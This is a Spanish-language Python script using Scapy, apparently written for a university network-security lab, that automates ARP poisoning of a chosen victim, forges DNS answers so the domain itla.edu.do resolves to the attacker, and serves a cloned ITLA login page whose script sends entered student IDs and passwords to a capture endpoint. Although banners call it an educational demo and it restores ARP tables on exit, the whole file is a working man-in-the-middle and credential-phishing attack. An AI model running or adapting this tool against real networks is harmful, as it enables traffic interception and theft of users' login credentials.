import os
import sys
import time
import signal
import threading
import subprocess
import socket
import ipaddress
 
# ── Verificar root ───────────────────────────────────────────────────────────
if os.geteuid() != 0:
    print("[-] Este script necesita ejecutarse como root.")
    print("    Usa: sudo python3 dns_spoofing_scapy.py")
    sys.exit(1)
 
# ── Verificar Scapy ──────────────────────────────────────────────────────────
try:
    from scapy.all import (
        ARP, Ether, IP, UDP, DNS, DNSQR, DNSRR,
        sniff, send, sendp, srp, get_if_hwaddr, conf
    )
except ImportError:
    print("[!] Scapy no está instalado. Ejecuta: pip3 install scapy")
    sys.exit(1)
 
# =============================================================================
#  COLORES
# =============================================================================
R  = "\033[0;31m";  G  = "\033[0;32m";  Y  = "\033[1;33m"
C  = "\033[0;36m";  B  = "\033[1m";     NC = "\033[0m"
 
def info(msg):    print(f"{C}[*]{NC} {msg}")
def success(msg): print(f"{G}[+]{NC} {msg}")
def warn(msg):    print(f"{Y}[!]{NC} {msg}")
def error(msg):   print(f"{R}[-]{NC} {msg}")
def step(n, msg): print(f"\n{B}{Y}══ PASO {n} ══{NC} {msg}\n")
 
# =============================================================================
#  CONFIGURACIÓN
# =============================================================================
IFACE         = "eth0"
SUBNET        = "10.6.82.0/26"
TARGET_DOMAIN = "itla.edu.do"
FAKE_PAGE_DIR = "/var/www/html"
LOG_FILE      = "/tmp/dns_spoof_scapy.log"
 
attack_active = True
spoof_count   = 0
arp_count     = 0
 
# =============================================================================
#  BANNER
# =============================================================================
def banner():
    print(f"""{R}
  ███████╗ ██████╗ █████╗ ██████╗ ██╗   ██╗
  ██╔════╝██╔════╝██╔══██╗██╔══██╗╚██╗ ██╔╝
  ███████╗██║     ███████║██████╔╝ ╚████╔╝
  ╚════██║██║     ██╔══██║██╔═══╝   ╚██╔╝
  ███████║╚██████╗██║  ██║██║        ██║
  ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝        ╚═╝
{NC}{B}  DNS Spoofing con Scapy | PNetLab Lab{NC}
{C}  Nombre: Mario de Leon | Matricula: 20250682{NC}
{C}  Red: {SUBNET}  |  Interfaz: {IFACE}{NC}
  ──────────────────────────────────────────
""")
 
# =============================================================================
#  OBTENER IP DE INTERFAZ — sin netifaces, solo con subprocess/socket
# =============================================================================
def get_iface_ip(iface: str) -> str:
    """Obtiene la IP de una interfaz usando 'ip addr show'."""
    try:
        out = subprocess.check_output(
            ["ip", "-4", "addr", "show", iface],
            stderr=subprocess.DEVNULL
        ).decode()
        for line in out.splitlines():
            line = line.strip()
            if line.startswith("inet "):
                return line.split()[1].split("/")[0]
    except Exception:
        pass
    return None
 
def get_gateway_ip(iface: str) -> str:
    """Obtiene la gateway por defecto de la interfaz."""
    try:
        out = subprocess.check_output(
            ["ip", "route", "show", "dev", iface],
            stderr=subprocess.DEVNULL
        ).decode()
        for line in out.splitlines():
            if "default" in line:
                return line.split()[2]
    except Exception:
        pass
    return None
 
# =============================================================================
#  PASO 1 — DETECCIÓN AUTOMÁTICA DE RED
# =============================================================================
def get_mac(ip: str) -> str:
    """Obtiene la MAC de una IP via ARP request con Scapy."""
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    result, _ = srp(pkt, iface=IFACE, timeout=2, verbose=False)
    if result:
        return result[0][1].hwsrc
    return None
 
def detect_network():
    step(1, "Detección automática de red")
 
    # IP del atacante — sin netifaces
    attacker_ip = get_iface_ip(IFACE)
    if not attacker_ip:
        error(f"No se detectó IP en {IFACE}. ¿Está la interfaz activa?")
        sys.exit(1)
    success(f"IP del Atacante  (Kali):  {attacker_ip}")
 
    # Gateway
    gateway_ip = get_gateway_ip(IFACE)
    if not gateway_ip:
        # Derivar: primer host de la /26
        gateway_ip = str(list(ipaddress.IPv4Network(SUBNET, strict=False).hosts())[0])
        warn(f"Gateway no detectada automáticamente. Usando: {gateway_ip}")
    else:
        success(f"Gateway (Router Central): {gateway_ip}")
 
    # ARP scan para encontrar hosts activos
    info(f"Escaneando {SUBNET} buscando hosts activos...")
    info("Esto puede tardar ~15 segundos...")
 
    network = ipaddress.IPv4Network(SUBNET, strict=False)
    answered, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(network)),
        iface=IFACE, timeout=3, verbose=False
    )
 
    hosts = [
        (rcv.psrc, rcv.hwsrc)
        for _, rcv in answered
        if rcv.psrc not in (attacker_ip, gateway_ip)
    ]
 
    if not hosts:
        error("No se encontraron hosts activos.")
        error("Asegúrate de que la Víctima (Windows 10) esté encendida.")
        sys.exit(1)
 
    print(f"\n{B}  Hosts encontrados:{NC}")
    for i, (ip, mac) in enumerate(hosts):
        print(f"    {G}[{i+1}]{NC} {ip}  {C}({mac}){NC}")
    print()
 
    if len(hosts) == 1:
        victim_ip, victim_mac = hosts[0]
        success(f"Víctima detectada automáticamente: {victim_ip}")
    else:
        choice = input(f"  {Y}Selecciona el número de la Víctima (Windows 10): {NC}")
        victim_ip, victim_mac = hosts[int(choice) - 1]
        success(f"Víctima seleccionada: {victim_ip}")
 
    # MAC del gateway
    gateway_mac = get_mac(gateway_ip)
    if not gateway_mac:
        error(f"No se pudo obtener la MAC del gateway {gateway_ip}.")
        sys.exit(1)
 
    attacker_mac = get_if_hwaddr(IFACE)
 
    print(f"""
  {B}Resumen de red:{NC}
    Atacante : {C}{attacker_ip}{NC}  MAC: {attacker_mac}
    Víctima  : {R}{victim_ip}{NC}  MAC: {victim_mac}
    Gateway  : {Y}{gateway_ip}{NC}  MAC: {gateway_mac}
    Dominio  : {G}{TARGET_DOMAIN}{NC} → {attacker_ip}
""")
    return attacker_ip, attacker_mac, victim_ip, victim_mac, gateway_ip, gateway_mac
 
# =============================================================================
#  PASO 2 — SERVIDOR WEB FALSO
# =============================================================================
def setup_fake_website(attacker_ip: str):
    step(2, "Configurando servidor web falso (Apache2)")
 
    html = f"""<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>ITLA - Portal Académico</title>
  <style>
    body {{ font-family: Arial, sans-serif; background:#f4f4f4; margin:0; }}
    .header {{ background:#003087; color:white; padding:20px 40px; }}
    .header h1 {{ font-size:22px; margin:0; }}
    .header p  {{ font-size:13px; margin:4px 0 0; opacity:.8; }}
    .banner {{ background:#cc0000; color:white; text-align:center;
               padding:10px; font-weight:bold; font-size:13px; }}
    .box {{ max-width:400px; margin:60px auto; background:white;
            border-radius:8px; box-shadow:0 2px 12px rgba(0,0,0,.15); padding:40px; }}
    .box h2 {{ color:#003087; margin-bottom:24px; }}
    label  {{ display:block; font-size:13px; color:#555; margin-bottom:4px; }}
    input  {{ width:100%; padding:10px; border:1px solid #ddd; border-radius:4px;
              font-size:14px; margin-bottom:16px; box-sizing:border-box; }}
    button {{ width:100%; padding:12px; background:#003087; color:white;
              border:none; border-radius:4px; font-size:15px; cursor:pointer; }}
    button:hover {{ background:#004ab3; }}
    footer {{ text-align:center; padding:20px; color:#888; font-size:12px; margin-top:40px; }}
  </style>
</head>
<body>
  <div class="header">
    <h1>ITLA — Instituto Tecnológico de Las Américas</h1>
    <p>Portal Académico Estudiantil</p>
  </div>
  <div class="banner">
    ⚠️ [DEMO DNS SPOOFING — SCAPY] Página FALSA con fines educativos | Mario de Leon 20250682
  </div>
  <div class="box">
    <h2>Iniciar Sesión</h2>
    <label>Matrícula</label>
    <input type="text" id="u" placeholder="Ej: 20250682">
    <label>Contraseña</label>
    <input type="password" id="p" placeholder="••••••••">
    <button onclick="cap()">Entrar</button>
  </div>
  <footer>© 2025 ITLA | itla.edu.do — Servidor falso: {attacker_ip}</footer>
  <script>
    function cap() {{
      fetch('/capture?u='+document.getElementById('u').value
                    +'&p='+document.getElementById('p').value);
      alert('Credenciales capturadas. (Solo demo educativo)');
    }}
  </script>
</body>
</html>"""
 
    with open(f"{FAKE_PAGE_DIR}/index.html", "w") as f:
        f.write(html)
 
    os.system("systemctl start apache2 2>/dev/null || service apache2 start 2>/dev/null")
    time.sleep(1)
 
    try:
        import urllib.request
        res = urllib.request.urlopen("http://localhost", timeout=3).read().decode()
        if "ITLA" in res:
            success(f"Servidor web falso activo → http://{attacker_ip}")
        else:
            warn("Apache respondió pero la página no cargó bien.")
    except Exception as e:
        warn(f"No se pudo verificar Apache localmente: {e}")
 
# =============================================================================
#  PASO 3 — IP FORWARDING
# =============================================================================
def enable_ip_forward():
    step(3, "Habilitando IP Forwarding")
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1")
    val = open("/proc/sys/net/ipv4/ip_forward").read().strip()
    if val == "1":
        success("IP Forwarding habilitado — la Víctima mantiene conectividad.")
    else:
        error("No se pudo habilitar IP Forwarding.")
        sys.exit(1)
 
# =============================================================================
#  PASO 4 — ARP POISONING
# =============================================================================
def arp_poison_loop(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac):
    global arp_count, attack_active
 
    pkt_to_victim = Ether(dst=victim_mac) / ARP(
        op=2,
        pdst=victim_ip,  hwdst=victim_mac,
        psrc=gateway_ip, hwsrc=attacker_mac
    )
    pkt_to_gateway = Ether(dst=gateway_mac) / ARP(
        op=2,
        pdst=gateway_ip,  hwdst=gateway_mac,
        psrc=victim_ip,   hwsrc=attacker_mac
    )
 
    info("ARP Poisoning iniciado (cada 2 segundos)...")
    while attack_active:
        sendp(pkt_to_victim,  iface=IFACE, verbose=False)
        sendp(pkt_to_gateway, iface=IFACE, verbose=False)
        arp_count += 2
        time.sleep(2)
 
def restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac):
    info("Restaurando tablas ARP...")
    pkt1 = Ether(dst=victim_mac) / ARP(
        op=2,
        pdst=victim_ip,  hwdst=victim_mac,
        psrc=gateway_ip, hwsrc=gateway_mac
    )
    pkt2 = Ether(dst=gateway_mac) / ARP(
        op=2,
        pdst=gateway_ip, hwdst=gateway_mac,
        psrc=victim_ip,  hwsrc=victim_mac
    )
    for _ in range(5):
        sendp(pkt1, iface=IFACE, verbose=False)
        sendp(pkt2, iface=IFACE, verbose=False)
        time.sleep(0.3)
    success("Tablas ARP restauradas.")
 
# =============================================================================
#  PASO 5 — DNS SPOOFING
# =============================================================================
def dns_spoof_callback(attacker_ip: str):
    global spoof_count
 
    def callback(pkt):
        global spoof_count
 
        if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0):
            return
        if not pkt.haslayer(DNSQR):
            return
 
        queried = pkt[DNSQR].qname.decode().rstrip(".")
 
        if TARGET_DOMAIN not in queried:
            return
 
        # Forjar respuesta DNS falsa
        spoofed = (
            IP(src=pkt[IP].dst, dst=pkt[IP].src) /
            UDP(sport=53, dport=pkt[UDP].sport) /
            DNS(
                id=pkt[DNS].id,
                qr=1,
                aa=1,
                qd=pkt[DNS].qd,
                an=DNSRR(
                    rrname=pkt[DNSQR].qname,
                    ttl=10,
                    rdata=attacker_ip
                )
            )
        )
 
        send(spoofed, iface=IFACE, verbose=False)
        spoof_count += 1
 
        msg = (f"[DNS SPOOF #{spoof_count}] "
               f"{pkt[IP].src} consultó '{queried}' "
               f"→ respondido con {attacker_ip}")
        print(f"  {G}{msg}{NC}")
        with open(LOG_FILE, "a") as lf:
            lf.write(msg + "\n")
 
    return callback
 
# =============================================================================
#  ESTADÍSTICAS
# =============================================================================
def stats_loop():
    global attack_active, spoof_count, arp_count
    while attack_active:
        time.sleep(10)
        if attack_active:
            print(f"\n  {C}[STATS]{NC} ARP pkts: {arp_count} | "
                  f"DNS queries envenenadas: {spoof_count}")
 
# =============================================================================
#  LIMPIEZA
# =============================================================================
def cleanup(victim_ip, victim_mac, gateway_ip, gateway_mac):
    global attack_active
    attack_active = False
    print(f"\n\n{B}{Y}══ PASO 6 ══{NC} Limpieza y restauración\n")
 
    restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac)
 
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("0")
    success("IP Forwarding deshabilitado.")
 
    ans = input(f"\n  {Y}¿Detener Apache (servidor web falso)? [s/N]: {NC}")
    if ans.lower() == "s":
        os.system("systemctl stop apache2 2>/dev/null || service apache2 stop 2>/dev/null")
        success("Apache detenido.")
 
    print(f"\n  {C}Log guardado en: {LOG_FILE}{NC}")
    print(f"  {G}Entorno restaurado correctamente.{NC}\n")
    sys.exit(0)
 
# =============================================================================
#  MAIN
# =============================================================================
def main():
    os.system("clear")
    banner()
 
    attacker_ip, attacker_mac, victim_ip, victim_mac, gateway_ip, gateway_mac = detect_network()
 
    setup_fake_website(attacker_ip)
    enable_ip_forward()
 
    step(4, "ARP Poisoning + DNS Spoofing con Scapy")
    warn(f"Víctima objetivo : {victim_ip}")
    warn(f"Gateway objetivo : {gateway_ip}")
    warn(f"Dominio a spoof  : {TARGET_DOMAIN} → {attacker_ip}")
    print()
    confirm = input(f"  {Y}¿Confirmar inicio del ataque? [s/N]: {NC}")
    if confirm.lower() != "s":
        warn("Ataque cancelado.")
        sys.exit(0)
 
    # Handler Ctrl+C
    signal.signal(signal.SIGINT,
        lambda s, f: cleanup(victim_ip, victim_mac, gateway_ip, gateway_mac))
 
    # Hilo ARP Poisoning
    arp_thread = threading.Thread(
        target=arp_poison_loop,
        args=(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac),
        daemon=True
    )
    arp_thread.start()
    success("Hilo ARP Poisoning iniciado.")
 
    # Hilo estadísticas
    threading.Thread(target=stats_loop, daemon=True).start()
 
    success("Iniciando sniff de paquetes DNS en eth0...")
    print(f"""
  {B}{G}══════════════════════════════════════════════════{NC}
  {B}{G}   ATAQUE ACTIVO{NC}
  {B}{G}══════════════════════════════════════════════════{NC}
 
  {C}Servidor web falso:{NC}  http://{attacker_ip}
  {C}Dominio envenenado:{NC}  {TARGET_DOMAIN} → {attacker_ip}
  {C}Víctima:{NC}             {victim_ip}
  {C}Log:{NC}                 {LOG_FILE}
 
  {Y}EN WINDOWS 10 (Víctima) ejecutar en CMD:{NC}
    {C}ipconfig /flushdns{NC}
    {C}nslookup {TARGET_DOMAIN}{NC}   ← debe responder con {attacker_ip}
    Luego abrir: {C}http://{TARGET_DOMAIN}{NC} en el navegador
 
  {R}Presiona Ctrl+C para detener y limpiar.{NC}
""")
 
    sniff(
        iface=IFACE,
        filter="udp port 53",
        prn=dns_spoof_callback(attacker_ip),
        store=False
    )
 
if __name__ == "__main__":
    main()



